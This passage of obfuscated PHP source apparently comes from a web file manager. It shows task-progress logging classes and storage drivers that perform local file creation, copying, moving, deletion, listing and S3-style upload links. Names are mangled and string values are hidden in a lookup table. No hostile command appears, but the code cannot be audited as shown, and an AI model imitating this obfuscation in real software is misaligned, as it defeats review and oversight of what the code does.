$ÁÄÀÒ¥‹) { $ùÆÈ÷âï =& $_SERVER[öæÛ¿©¿]; $¦ÒÉåıÂ =& $this->task; if ($ÁÄÀÒ¥‹ > 0) { $¦ÒÉåıÂ[$ùÆÈ÷âï[1176]] = $ùÆÈ÷âï[2006]; $¦ÒÉåıÂ[$ùÆÈ÷âï[1980]] = $ùÆÈ÷âï[108]; if ($¦ÒÉåıÂ[$ùÆÈ÷âï[1978]]) { $¦ÒÉåıÂ[$ùÆÈ÷âï[1979]] = $ÁÄÀÒ¥‹; } if ($¦ÒÉåıÂ[$ùÆÈ÷âï[1981]]) { $¦ÒÉåıÂ[$ùÆÈ÷âï[1979]] = $ÁÄÀÒ¥‹ + $¦ÒÉåıÂ[$ùÆÈ÷âï[1981]]; } } else { if ($¸ó¼Í æ > 0) { if ($¦ÒÉåıÂ[$ùÆÈ÷âï[1978]] == $ïÆúÊ×²) { $¦ÒÉåıÂ[$ùÆÈ÷âï[1979]] = $¸ó¼Í æ; $¦ÒÉåıÂ[$ùÆÈ÷âï[1176]] = $ùÆÈ÷âï[2007]; $¦ÒÉåıÂ[$ùÆÈ÷âï[1980]] = $ùÆÈ÷âï[1327]; } } } $this->update(); $ÕàÓ­Âá = "\x64\157\167\x6e\72{$¸ó¼Í æ}\57{$ïÆúÊ×²}\x3b\x20\165\160\x6c\x6f\141\x64\72{$ÁÄÀÒ¥‹}\x2f{$Åâå­æÏ}\73\x66\151\x6c\145\x3d" . $¦ÒÉåıÂ[$ùÆÈ÷âï[1978]]; self::log(array($ùÆÈ÷âï[2008] . $ÕàÓ­Âá . $ùÆÈ÷âï[74] . $¦ÒÉåıÂ[$ùÆÈ÷âï[1976]], curl_getinfo($†äêòª°))); } public function curlProgressStart($’­Ã¶³¨) { } public function curlProgressEnd($©‚í«èš) { $Øëø£„ =& $_SERVER[öæÛ¿©¿]; $¤ë’ü±­ =& $this->task; $Ä¨·¸ø¶ = curl_getinfo($©‚í«èš); $¾á€ÎÚü = $Ä¨·¸ø¶[$Øëø£„[2009]]; if ($¾á€ÎÚü == -1) { $¾á€ÎÚü = $Ä¨·¸ø¶[$Øëø£„[2010]]; } if ($¤ë’ü±­[$Øëø£„[1980]] == $Øëø£„[108] && $¾á€ÎÚü) { $¤ë’ü±­[$Øëø£„[1981]] += $¾á€ÎÚü; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $õ¾ú¸ü =& $_SERVER[öæÛ¿©¿]; $Ÿù¥§…Ò =& $this->task; $Ÿù¥§…Ò[$õ¾ú¸ü[2011]] = 1; Hook::bind($õ¾ú¸ü[1970], array($this, $õ¾ú¸ü[2012])); Hook::bind($õ¾ú¸ü[1972], array($this, $õ¾ú¸ü[2013])); Hook::bind($õ¾ú¸ü[1974], array($this, $õ¾ú¸ü[2014])); } protected function endAfter() { $ùÂ†æš² =& $_SERVER[öæÛ¿©¿]; Hook::unbind($ùÂ†æš²[1970], array($this, $ùÂ†æš²[2012])); Hook::unbind($ùÂ†æš²[1972], array($this, $ùÂ†æš²[2013])); Hook::unbind($ùÂ†æš²[1974], array($this, $ùÂ†æš²[2014])); } public function progressStart($Ğó”Ì¶ñ) { $¡Ø…ˆÏË =& $_SERVER[öæÛ¿©¿]; $«‰ñ€‚˜ = curl_getinfo($Ğó”Ì¶ñ); self::log($¡Ø…ˆÏË[2015] . $«‰ñ€‚˜[$¡Ø…ˆÏË[383]]); self::valueSet($this->task[$¡Ø…ˆÏË[483]], $this->task); } public function progressEnd($²™¨…Äˆ) { $Ã©£ñ¦’ =& $_SERVER[öæÛ¿©¿]; self::log($Ã©£ñ¦’[2016] . $this->task[$Ã©£ñ¦’[483]]); $this->end(); } public function progress($—àì†ôµ, $Ùäå©Âè, $ö˜¼üÑÌ, $£êÙ„Ö, $”ïâº£) { $´¢ËÑÄ– =& $_SERVER[öæÛ¿©¿]; $¨ˆœ²çÕ =& $this->task; if ($”ïâº£ > 0) { $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]] = $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]] == 0 ? $£êÙ„Ö : $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]]; $¨ˆœ²çÕ[$´¢ËÑÄ–[1925]] = $”ïâº£; } else { if ($ö˜¼üÑÌ > 0) { $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]] = $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]] == 0 ? $Ùäå©Âè : $¨ˆœ²çÕ[$´¢ËÑÄ–[1174]]; $¨ˆœ²çÕ[$´¢ËÑÄ–[1925]] = $ö˜¼üÑÌ; } } $this->update(); self::log("\x70\x72\x6f\x67\162\145\163\163\x48\164\164\x70\x3a\144\157\167\x6e\72{$ö˜¼üÑÌ}\x2f{$Ùäå©Âè}\73\40\x75\160\154\x6f\141\144\72{$”ïâº£}\x2f{$£êÙ„Ö}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¬ğã¾öê, $Õ½Ä²ğ’ = '', $ï¥âà¦ê = 0, $òƒ®ÅÚ£ = '') { $çõ´§Ü =& $_SERVER[öæÛ¿©¿]; $òƒ®ÅÚ£ = $òƒ®ÅÚ£ ? $òƒ®ÅÚ£ : ($Õ½Ä²ğ’ ? $Õ½Ä²ğ’ : $¬ğã¾öê); $¹ãïé«Ñ = new Task($¬ğã¾öê, $Õ½Ä²ğ’, $ï¥âà¦ê, $òƒ®ÅÚ£); $GLOBALS[$çõ´§Ü[2017] . $¬ğã¾öê] = new TaskLog($çõ´§Ü[1909], $¹ãïé«Ñ, $òƒ®ÅÚ£); return $¹ãïé«Ñ; } public function __construct($”Í…¶Ö = '', $ù±©’ˆò = '', $ú¾ô·˜¢ = '') { $ùÍ’Êí =& $_SERVER[öæÛ¿©¿]; if (!$”Í…¶Ö) { $”Í…¶Ö = $ùÍ’Êí[1909]; } $ô‚²‡˜ = $”Í…¶Ö . $ùÍ’Êí[473] . rand_string(10); if (!$ú¾ô·˜¢) { $ú¾ô·˜¢ = $”Í…¶Ö . $ùÍ’Êí[53] . $ú¾ô·˜¢; } switch ($”Í…¶Ö) { case $ùÍ’Êí[1909]: if (!$ù±©’ˆò || !$ù±©’ˆò->task) { return echoLog($”Í…¶Ö . $ùÍ’Êí[2018]); } $ÙÚ™¦È— = $ù±©’ˆò; $ô‚²‡˜ = $ÙÚ™¦È—->task[$ùÍ’Êí[483]]; $”Í…¶Ö = $ÙÚ™¦È—->task[$ùÍ’Êí[483]]; if (!$ÙÚ™¦È—->task[$ùÍ’Êí[1813]]) { $ÙÚ™¦È—->task[$ùÍ’Êí[1813]] = $ú¾ô·˜¢ ? $ú¾ô·˜¢ : $”Í…¶Ö; } break; case $ùÍ’Êí[2019]: if (!$ù±©’ˆò) { return echoLog($”Í…¶Ö . $ùÍ’Êí[2020]); } $ …€Ø˜ = is_string($ù±©’ˆò) ? array($ù±©’ˆò) : $ù±©’ˆò; $ÙÚ™¦È— = new TaskFileTransfer($ô‚²‡˜, $”Í…¶Ö, 0, $ú¾ô·˜¢ ? $ú¾ô·˜¢ : $ …€Ø˜[0]); foreach ($ …€Ø˜ as $ıÓ¹ÁÈ ) { $ÙÚ™¦È—->addPath($ıÓ¹ÁÈ ); } break; case $ùÍ’Êí[389]: if (!$ù±©’ˆò) { return echoLog($”Í…¶Ö . $ùÍ’Êí[2020]); } $ …€Ø˜ = is_string($ù±©’ˆò) ? array($ù±©’ˆò) : $ù±©’ˆò; $ÙÚ™¦È— = new TaskZip($ô‚²‡˜, $”Í…¶Ö, 0, $ú¾ô·˜¢ ? $ú¾ô·˜¢ : $ …€Ø˜[0]); foreach ($ …€Ø˜ as $ıÓ¹ÁÈ ) { $ÙÚ™¦È—->addPath($ıÓ¹ÁÈ ); } break; case $ùÍ’Êí[1347]: if (!$ù±©’ˆò) { return echoLog($”Í…¶Ö . $ùÍ’Êí[2020]); } $ÙÚ™¦È— = new TaskUnZip($ô‚²‡˜, $”Í…¶Ö, 0, $ú¾ô·˜¢ ? $ú¾ô·˜¢ : $ù±©’ˆò); if ($ù±©’ˆò) { $ÙÚ™¦È—->addFile($ù±©’ˆò); } break; case $ùÍ’Êí[150]: $ÙÚ™¦È— = new TaskHttp($ô‚²‡˜, $”Í…¶Ö); break; default: return; break; } $this->task = $ÙÚ™¦È—; $this->taskID = $ô‚²‡˜; Hook::bind($ùÍ’Êí[1945], array($this, $ùÍ’Êí[2021])); Hook::bind($ùÍ’Êí[1947], array($this, $ùÍ’Êí[2022])); Hook::bind($ùÍ’Êí[1941], array($this, $ùÍ’Êí[2023])); echoLog($ùÍ’Êí[2024] . $ÙÚ™¦È—->task[$ùÍ’Êí[1813]]); } public function __destruct() { $this->end(); } public function end($¸½í¥š¦ = '') { $’ªæ¦‡ =& $_SERVER[öæÛ¿©¿]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¸½í¥š¦); $this->task = !1; $this->taskID = !1; Hook::unbind($’ªæ¦‡[1945], array($this, $’ªæ¦‡[2021])); Hook::unbind($’ªæ¦‡[1947], array($this, $’ªæ¦‡[2022])); Hook::unbind($’ªæ¦‡[1941], array($this, $’ªæ¦‡[2023])); } public function taskUpdate($®Èä¥Ô‹) { $Áşº°éÂ =& $_SERVER[öæÛ¿©¿]; if (!$®Èä¥Ô‹ || $this->taskID != $®Èä¥Ô‹[$Áşº°éÂ[483]]) { return; } $ª£ç½—ë = 20; $ş¯á¬ù = intval($®Èä¥Ô‹[$Áşº°éÂ[1926]] * $ª£ç½—ë); $‚Îñ¢±‰ = $Áşº°éÂ[174] . str_repeat($Áşº°éÂ[464], $ş¯á¬ù) . $Áşº°éÂ[1126] . str_repeat($Áşº°éÂ[53], $ª£ç½—ë - $ş¯á¬ù) . $Áşº°éÂ[176]; $°­À•Ì = $‚Îñ¢±‰ . sprintf($Áşº°éÂ[2025], $®Èä¥Ô‹[$Áşº°éÂ[1926]] * 100) . $Áşº°éÂ[2026]; $³üŒğ•Í = $°­À•Ì . $®Èä¥Ô‹[$Áşº°éÂ[1925]] . $Áşº°éÂ[8] . $®Èä¥Ô‹[$Áşº°éÂ[1174]] . LNG($Áşº°éÂ[2027]); $§§¡×û = $Áşº°éÂ[12]; if ($®Èä¥Ô‹[$Áşº°éÂ[2011]]) { $³üŒğ•Í = $°­À•Ì . size_format($®Èä¥Ô‹[$Áşº°éÂ[1925]]) . $Áşº°éÂ[8] . size_format($®Èä¥Ô‹[$Áşº°éÂ[1174]]); $§§¡×û = size_format($®Èä¥Ô‹[$Áşº°éÂ[1927]]) . $Áşº°éÂ[2028]; } if ($®Èä¥Ô‹[$Áşº°éÂ[1176]]) { $®Èä¥Ô‹[$Áşº°éÂ[1976]] = $®Èä¥Ô‹[$Áşº°éÂ[1176]] . $Áşº°éÂ[53] . $®Èä¥Ô‹[$Áşº°éÂ[1976]]; } if ($®Èä¥Ô‹[$Áşº°éÂ[1976]]) { $²åš˜‚Õ = $Áşº°éÂ[12]; if ($®Èä¥Ô‹[$Áşº°éÂ[1978]]) { $²åš˜‚Õ = $Áşº°éÂ[50] . size_format($®Èä¥Ô‹[$Áşº°éÂ[1979]]) . $Áşº°éÂ[8] . size_format($®Èä¥Ô‹[$Áşº°éÂ[1978]]); } $§§¡×û .= $®Èä¥Ô‹[$Áşº°éÂ[1976]] . $²åš˜‚Õ; } if ($®Èä¥Ô‹[$Áşº°éÂ[856]] && !$®Èä¥Ô‹[$Áşº°éÂ[1978]]) { $§§¡×û .= $Áşº°éÂ[53] . size_format($®Èä¥Ô‹[$Áşº°éÂ[1983]]) . $Áşº°éÂ[8] . size_format($®Èä¥Ô‹[$Áşº°éÂ[856]]); } echoLog($³üŒğ•Í . $Áşº°éÂ[53] . $§§¡×û, !0); } public function taskEnd($ÃìÇ’Õ) { $–ßù®‘ =& $_SERVER[öæÛ¿©¿]; if (!$ÃìÇ’Õ || $this->taskID != $ÃìÇ’Õ[$–ßù®‘[483]]) { return; } $ÖïĞæÌÕ = $ÃìÇ’Õ ? LNG($–ßù®‘[2029]) . $–ßù®‘[4] . $ÃìÇ’Õ[$–ßù®‘[1925]] . $–ßù®‘[8] . $ÃìÇ’Õ[$–ßù®‘[1174]] . LNG($–ßù®‘[2027]) . $–ßù®‘[74] : $–ßù®‘[12]; echoLog($–ßù®‘[2030] . $ÃìÇ’Õ[$–ßù®‘[1813]] . ($ÃìÇ’Õ[$–ßù®‘[536]] ? $–ßù®‘[74] . $ÃìÇ’Õ[$–ßù®‘[536]] : $–ßù®‘[12]) . $–ßù®‘[74] . $ÖïĞæÌÕ . $–ßù®‘[2031] . sprintf($–ßù®‘[955], timeFloat() - $ÃìÇ’Õ[$–ßù®‘[1928]]) . $–ßù®‘[1940]); $this->end(); } public function taskKill($™’¸ï¦Â) { $ÖÙ‡Á¢œ =& $_SERVER[öæÛ¿©¿]; if (!$™’¸ï¦Â || $this->taskID != $™’¸ï¦Â[$ÖÙ‡Á¢œ[483]]) { return; } echoLog($ÖÙ‡Á¢œ[2032] . $™’¸ï¦Â[$ÖÙ‡Á¢œ[1813]]); } } goto fË’ø¶‘; e¨Òä†¿Á: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($å¿ê°Ûİ) { parent::__construct($å¿ê°Ûİ); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } public function uploadLink($íÆ¦Ò¿Ê, $³šŒàú¹ = 0) { $èÖÛ´›è =& $_SERVER[öæÛ¿©¿]; if ($this->isUploadServer()) { return; } $‘øÄù¨« = $this->getType(); if (!in_array($‘øÄù¨«, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¶¿·öŸö = (!$³šŒàú¹ ? 1 : ceil($³šŒàú¹ / pow(1024, 3))) * 3600 * 4; $ìÀá¹Ÿ = $this->uploadMultiData($íÆ¦Ò¿Ê, $¶¿·öŸö); if ($ìÀá¹Ÿ) { $ìÀá¹Ÿ[$èÖÛ´›è[95]] = $íÆ¦Ò¿Ê; $ìÀá¹Ÿ[$èÖÛ´›è[96]] = $‘øÄù¨«; } return $ìÀá¹Ÿ; } public function fileOutImage($§²§ŞÖĞ, $ÂÙÔè÷¼ = 250) { if ($this->size($§²§ŞÖĞ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($§²§ŞÖĞ, $ÂÙÔè÷¼); } $ÌûÎ›É = $this->link($§²§ŞÖĞ); $ÌûÎ›É .= $_SERVER[öæÛ¿©¿][1606] . $ÂÙÔè÷¼; $this->fileOutLink($ÌûÎ›É); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($µ¶…Ô²º) { if (substr($µ¶…Ô²º, 0, 2) == $_SERVER[öæÛ¿©¿][1468]) { $µ¶…Ô²º = BASIC_PATH . substr($µ¶…Ô²º, 2); } return $µ¶…Ô²º; } public function iconvApp($ùˆ¬ıÈ¤) { $ä®‘ÀèÖ =& $_SERVER[öæÛ¿©¿]; global $config; return $this->iconvTo($ùˆ¬ıÈ¤, $config[$ä®‘ÀèÖ[1592]], $config[$ä®‘ÀèÖ[1591]]); } public function iconvSystem($÷¨ŸÔ¤) { $¼š°Ò¥Ë =& $_SERVER[öæÛ¿©¿]; global $config; return $this->iconvTo($÷¨ŸÔ¤, $config[$¼š°Ò¥Ë[1591]], $config[$¼š°Ò¥Ë[1592]]); } public function getPathOuter($Ï­õıİè) { $ä”Ê†Õ’ =& $_SERVER[öæÛ¿©¿]; $Ú’¢Àô = $this->iconvApp($this->pathBase); $Ï­õıİè = $this->iconvApp($Ï­õıİè); if (substr($Ú’¢Àô, 0, 2) == $ä”Ê†Õ’[1468]) { $Ú’¢Àô = BASIC_PATH . substr($Ú’¢Àô, 2); } if (substr($Ï­õıİè, 0, 2) == $ä”Ê†Õ’[1468]) { $Ï­õıİè = BASIC_PATH . substr($Ï­õıİè, 2); } $Ú’¢Àô = KodIO::clear($Ú’¢Àô); $Ï­õıİè = KodIO::clear($Ï­õıİè); $Ï­õıİè = substr($Ï­õıİè, strlen($Ú’¢Àô)); if (empty($this->pathDriver)) { return $Ï­õıİè; } return $this->pathDriver . $ä”Ê†Õ’[8] . ltrim($Ï­õıİè, $ä”Ê†Õ’[8]); } public function mkfile($çÙÔËÎÕ, $„›®®°ı = '', $Ì¥‘…€ = REPEAT_RENAME) { $çÙÔËÎÕ = $this->iconvSystem($çÙÔËÎÕ); @touch($çÙÔËÎÕ); if ($„›®®°ı) { file_put_contents($çÙÔËÎÕ, $„›®®°ı); } @chmod($çÙÔËÎÕ, $this->pathAuth); if (is_file($çÙÔËÎÕ)) { return $this->getPathOuter($çÙÔËÎÕ); } $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } public function mkdir($éïÎÃà´, $æİ¼ò´Û = REPEAT_SKIP) { $éïÎÃà´ = $this->iconvSystem($éïÎÃà´); if (is_dir($éïÎÃà´)) { return $this->getPathOuter($éïÎÃà´); } @mkdir($éïÎÃà´, $this->pathAuth, !0); @chmod($éïÎÃà´, $this->pathAuth); if (is_dir($éïÎÃà´)) { return $this->getPathOuter($éïÎÃà´); } $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } public function copyFile($äùıÒÒß, $ßşÒ£Ú”) { $this->mkdir($this->pathFather($ßşÒ£Ú”)); $äùıÒÒß = $this->iconvSystem($äùıÒÒß); $ßşÒ£Ú” = $this->iconvSystem($ßşÒ£Ú”); $³åôÊ¡æ = copy_64($äùıÒÒß, $ßşÒ£Ú”); @chmod($ßşÒ£Ú”, $this->pathAuth); if ($³åôÊ¡æ) { return $this->getPathOuter($ßşÒ£Ú”); } $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } public function moveFile($ı‰Õ«ÙÎ, $’Üï”‡) { $this->mkdir($this->pathFather($’Üï”‡)); $ı‰Õ«ÙÎ = $this->iconvSystem($ı‰Õ«ÙÎ); $’Üï”‡ = $this->iconvSystem($’Üï”‡); $”‚„Šßî = intval(@rename($ı‰Õ«ÙÎ, $’Üï”‡)); if (!$”‚„Šßî) { if ($”‚„Šßî = intval(@copy_64($ı‰Õ«ÙÎ, $’Üï”‡))) { @unlink($ı‰Õ«ÙÎ); } } @chmod($’Üï”‡, $this->pathAuth); if ($”‚„Šßî) { return $this->getPathOuter($’Üï”‡); } $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } public function movePath($ã«˜°…ş, $ğ™Äçğ”, $¢Ô©×µ = false) { $»Ú‡òò“ =& $_SERVER[öæÛ¿©¿]; $ã«˜°…ş = $this->iconvSystem($ã«˜°…ş); $ğ™Äçğ” = $this->iconvSystem($ğ™Äçğ”); $ä–¦µÆ® = rtrim($ğ™Äçğ”, $»Ú‡òò“[8]) . $»Ú‡òò“[8] . ($¢Ô©×µ ? $¢Ô©×µ : get_path_this($ã«˜°…ş)); if (file_exists($ä–¦µÆ®)) { return !1; } $ìğÑ¡æã = intval(@rename($ã«˜°…ş, $ä–¦µÆ®)); $ìğÑ¡æã = file_exists($ä–¦µÆ®); if ($ìğÑ¡æã) { return $this->getPathOuter($ä–¦µÆ®); } $this->writeLog(__FUNCTION__ . $»Ú‡òò“[1603], !0); return !1; } public function delFile($®êË²½Ê) { $®êË²½Ê = $this->iconvSystem($®êË²½Ê); if (!@unlink($®êË²½Ê)) { @chmod($®êË²½Ê, $this->pathAuth); if (@unlink($®êË²½Ê)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } return !0; } public function delFolder($­¥Ç‹Øœ) { $“š«×³Ÿ =& $_SERVER[öæÛ¿©¿]; $­¥Ç‹Øœ = $this->iconvSystem($­¥Ç‹Øœ); if (!is_dir($­¥Ç‹Øœ)) { return !0; } if (!($µ¸™ù‰– = opendir($­¥Ç‹Øœ))) { return !1; } while (($ú•ìÜù = readdir($µ¸™ù‰–)) !== !1) { if ($ú•ìÜù == $“š«×³Ÿ[10] || $ú•ìÜù == $“š«×³Ÿ[1413]) { continue; } $€ÑŠ°™é = $­¥Ç‹Øœ . $“š«×³Ÿ[8] . $ú•ìÜù; if (is_file($€ÑŠ°™é) || is_link($€ÑŠ°™é)) { if (!unlink($€ÑŠ°™é)) { chmod($€ÑŠ°™é, $this->pathAuth); if (!unlink($€ÑŠ°™é)) { return !1; } } } else { if (is_dir($€ÑŠ°™é)) { chmod($€ÑŠ°™é, $this->pathAuth); $€ÑŠ°™é = $this->iconvApp($€ÑŠ°™é); if (!$this->delFolder($€ÑŠ°™é)) { return !1; } } } } closedir($µ¸™ù‰–); return rmdir($­¥Ç‹Øœ); } public function rename($–¯¦Ôö¨, $ñ‹âç‘¾) { $Õñ¦Ø´ü =& $_SERVER[öæÛ¿©¿]; $Ñ¶ÄàÆ€ = $this->fileNameAuto($this->pathFather($–¯¦Ôö¨), $ñ‹âç‘¾); $Ñ¶ÄàÆ€ = $this->iconvSystem($Ñ¶ÄàÆ€); $–¯¦Ôö¨ = $this->iconvSystem($–¯¦Ôö¨); $‹ÑŠíµ² = $this->pathFather($–¯¦Ôö¨); $ ùó¶»Î = rtrim($‹ÑŠíµ², $Õñ¦Ø´ü[8]) . $Õñ¦Ø´ü[8] . $Ñ¶ÄàÆ€; $Ó—¬ƒï¨ = @rename($–¯¦Ôö¨, $ ùó¶»Î); $ ùó¶»Î = $this->iconvApp($ ùó¶»Î); if ($Ó—¬ƒï¨) { return $this->getPathOuter($ ùó¶»Î); } $this->writeLog(__FUNCTION__ . $Õñ¦Ø´ü[1603], !0); return !1; } public function size($°·‰Ì·‘) { $°·‰Ì·‘ = $this->iconvSystem($°·‰Ì·‘); return filesize_64($°·‰Ì·‘); } public function info($µ±„ ÷‰) { $µ±„ ÷‰ = $this->iconvSystem($µ±„ ÷‰); if ($this->isFolder($µ±„ ÷‰)) { return $this->folderInfo($µ±„ ÷‰); } else { if ($this->isFile($µ±„ ÷‰)) { return $this->fileInfo($µ±„ ÷‰); } } return !1; } protected function infoChildren($ÜãÏîï, &$¢Á«â‹Œ, $³ÛÂ£àè = true) { $›Şöë†¨ =& $_SERVER[öæÛ¿©¿]; check_abort_echo(); $ÜãÏîï = rtrim($ÜãÏîï, $›Şöë†¨[8]) . $›Şöë†¨[8]; if ($³ÛÂ£àè) { $ÜãÏîï = $this->iconvSystem($ÜãÏîï); } if (!($ï¹ŒĞ¸… = @opendir($ÜãÏîï))) { return; } while (($ÆİÅÚ»Ã = readdir($ï¹ŒĞ¸…)) !== !1) { if ($ÆİÅÚ»Ã == $›Şöë†¨[10] || $ÆİÅÚ»Ã == $›Şöë†¨[1413]) { continue; } $“’²›µ­ = $ÜãÏîï . $ÆİÅÚ»Ã; if (is_file($“’²›µ­) || is_link($“’²›µ­)) { $¢Á«â‹Œ[$›Şöë†¨[80]]++; $¢Á«â‹Œ[$›Şöë†¨[79]] += filesize_64($“’²›µ­); } else { if (is_dir($“’²›µ­)) { $¢Á«â‹Œ[$›Şöë†¨[81]]++; $this->infoChildren($“’²›µ­, $¢Á«â‹Œ, !1); } } } closedir($ï¹ŒĞ¸…); } private function folderInfo($¿›Åä€ù, $»¬Ç ğı = false) { $Î›çÊ– =& $_SERVER[öæÛ¿©¿]; $¿›Åä€ù = rtrim($¿›Åä€ù, $Î›çÊ–[8]) . $Î›çÊ–[8]; $ƒï®ê³ = $this->iconvApp($this->pathThis($¿›Åä€ù)); if ($»¬Ç ğı) { return array($Î›çÊ–[32] => $ƒï®ê³, $Î›çÊ–[87] => $this->getPathOuter($¿›Åä€ù), $Î›çÊ–[33] => $Î›çÊ–[78]); } $†œâ–ü = array($Î›çÊ–[32] => $ƒï®ê³, $Î›çÊ–[87] => $this->getPathOuter($¿›Åä€ù), $Î›çÊ–[33] => $Î›çÊ–[78], $Î›çÊ–[232] => @filectime($¿›Åä€ù), $Î›çÊ–[88] => @filemtime($¿›Åä€ù), $Î›çÊ–[1607] => @fileatime($¿›Åä€ù), $Î›çÊ–[1608] => is_readable($¿›Åä€ù), $Î›çÊ–[1609] => is_writable($¿›Åä€ù), $Î›çÊ–[1610] => get_mode($¿›Åä€ù)); return $†œâ–ü; } private function fileInfo($Ñí–¦­, $ø¬ò¶·Á = false) { $Îø¨’Áõ =& $_SERVER[öæÛ¿©¿]; $¢¾¾†’ = $this->iconvApp($this->pathThis($Ñí–¦­)); if ($ø¬ò¶·Á) { return array($Îø¨’Áõ[32] => $¢¾¾†’, $Îø¨’Áõ[87] => $this->getPathOuter($Ñí–¦­), $Îø¨’Áõ[33] => $Îø¨’Áõ[231], $Îø¨’Áõ[79] => $this->size($Ñí–¦­), $Îø¨’Áõ[167] => $this->ext($¢¾¾†’)); } $ÀÏøëÇ­ = array($Îø¨’Áõ[32] => $¢¾¾†’, $Îø¨’Áõ[87] => $this->getPathOuter($Ñí–¦­), $Îø¨’Áõ[33] => $Îø¨’Áõ[231], $Îø¨’Áõ[232] => @filectime($Ñí–¦­), $Îø¨’Áõ[88] => @filemtime($Ñí–¦­), $Îø¨’Áõ[1607] => @fileatime($Ñí–¦­), $Îø¨’Áõ[79] => $this->size($Ñí–¦­), $Îø¨’Áõ[167] => $this->ext($¢¾¾†’), $Îø¨’Áõ[1608] => is_readable($Ñí–¦­), $Îø¨’Áõ[1609] => is_writable($Ñí–¦­), $Îø¨’Áõ[1610] => get_mode($Ñí–¦­)); return $ÀÏøëÇ­; } public function exist($¬•ıêçÕ) { $¬•ıêçÕ = $this->iconvSystem($¬•ıêçÕ); return @file_exists($¬•ıêçÕ); } public function isFile($åšÜù‚Ë) { $åšÜù‚Ë = $this->iconvSystem($åšÜù‚Ë); return @is_file($åšÜù‚Ë); } public function isFolder($”¬şô×Š) { $”¬şô×Š = $this->iconvSystem($”¬şô×Š); return @is_dir($”¬şô×Š); } public function listPath($×Í²—Öû, $Üà›ö’œ = false) { $•™Î•Á =& $_SERVER[öæÛ¿©¿]; $×Í²—Öû = $this->iconvSystem($×Í²—Öû); $×Í²—Öû = rtrim($×Í²—Öû, $•™Î•Á[8]) . $•™Î•Á[8]; $˜ığÖÓÍ = array($•™Î•Á[85] => array(), $•™Î•Á[86] => array()); if (!($ğã—ƒÑ = @opendir($×Í²—Öû))) { return $˜ığÖÓÍ; } while (($ÖªØ£Û— = readdir($ğã—ƒÑ)) !== !1) { if ($ÖªØ£Û— == $•™Î•Á[10] || $ÖªØ£Û— == $•™Î•Á[1413]) { continue; } $è‡±ƒªô = $×Í²—Öû . $ÖªØ£Û—; if (is_file($è‡±ƒªô)) { $˜ığÖÓÍ[$•™Î•Á[86]][] = $this->fileInfo($è‡±ƒªô, $Üà›ö’œ); } else { $˜ığÖÓÍ[$•™Î•Á[85]][] = $this->folderInfo($è‡±ƒªô, $Üà›ö’œ); } } closedir($ğã—ƒÑ); return $˜ığÖÓÍ; } public function listAll($„îÊÈ¶, &$ê§Â®àƒ = array()) { $å¡ª›µˆ =& $_SERVER[öæÛ¿©¿]; $„îÊÈ¶ = $this->iconvSystem($„îÊÈ¶); $„îÊÈ¶ = rtrim($„îÊÈ¶, $å¡ª›µˆ[8]) . $å¡ª›µˆ[8]; if (!($Ç¬şíè² = @opendir($„îÊÈ¶))) { return $ê§Â®àƒ; } while (($¶ıÛˆ³ì = readdir($Ç¬şíè²)) !== !1) { if ($¶ıÛˆ³ì == $å¡ª›µˆ[10] || $¶ıÛˆ³ì == $å¡ª›µˆ[1413]) { continue; } $ğØºËç = $„îÊÈ¶ . $¶ıÛˆ³ì; $Ô“ÉÉ­Ì = is_dir($ğØºËç) && !is_link($ğØºËç) ? 1 : 0; $ğØºËç = $Ô“ÉÉ­Ì ? $ğØºËç . $å¡ª›µˆ[8] : $ğØºËç; $ê§Â®àƒ[] = array($å¡ª›µˆ[87] => $this->getPathOuter($ğØºËç), $å¡ª›µˆ[78] => $Ô“ÉÉ­Ì, $å¡ª›µˆ[88] => intval(@filemtime($ğØºËç)), $å¡ª›µˆ[79] => $Ô“ÉÉ­Ì ? 0 : intval($this->size($ğØºËç))); if ($Ô“ÉÉ­Ì) { $this->listAll($ğØºËç, $ê§Â®àƒ); } } closedir($Ç¬şíè²); return $ê§Â®àƒ; } public function has($ìúàŸï¡, $»èğ ğ = false, $ËşÔáÒ´ = true) { $¥êÜ´Ş¼ =& $_SERVER[öæÛ¿©¿]; $ìúàŸï¡ = $this->iconvSystem($ìúàŸï¡); $ìúàŸï¡ = rtrim($ìúàŸï¡, $¥êÜ´Ş¼[8]) . $¥êÜ´Ş¼[8]; if (!($ªó±¦„À = @opendir($ìúàŸï¡))) { return !1; } $¥ŠÔÙÙë = 0; $·û´±‹ü = 0; $×èê¦Ä = 0; while (($¡âæ¤ = readdir($ªó±¦„À)) !== !1) { if ($¡âæ¤ == $¥êÜ´Ş¼[10] || $¡âæ¤ == $¥êÜ´Ş¼[1413]) { continue; } $„®ÌÎ­ = $ìúàŸï¡ . $¡âæ¤; if ($»èğ ğ) { $×èê¦Ä++; if (@is_file($„®ÌÎ­)) { $¥ŠÔÙÙë++; } else { $·û´±‹ü++; } if ($×èê¦Ä > 10000) { break; } continue; } if ($ËşÔáÒ´) { if (@is_file($„®ÌÎ­)) { return !0; } } else { if (@is_dir($„®ÌÎ­ . $¥êÜ´Ş¼[8])) { return !0; } } } closedir($ªó±¦„À); if ($»èğ ğ) { return array($¥êÜ´Ş¼[240] => $¥ŠÔÙÙë, $¥êÜ´Ş¼[241] => $·û´±‹ü); } return !1; } public function hashSimple($Õ¾íÇˆ¬) { $¼ù²âŠĞ =& $_SERVER[öæÛ¿©¿]; if (!$Õ¾íÇˆ¬) { return 